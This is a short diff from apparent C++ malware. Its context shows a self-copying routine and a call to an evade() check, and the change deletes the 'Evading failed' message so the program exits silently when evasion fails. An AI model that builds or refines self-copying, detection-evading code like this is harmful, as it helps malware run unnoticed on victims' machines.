@@ -65,7 +65,6 @@ void copy_self(char* filename, char save_path[], char create_path[]) {
 
 int main(int argc, char *argv[]) {
     if (evade()) {
-        cout << "Evading failed" << endl;
         return 1;
     }
     char create_path[] = "C:\\Temp\\";
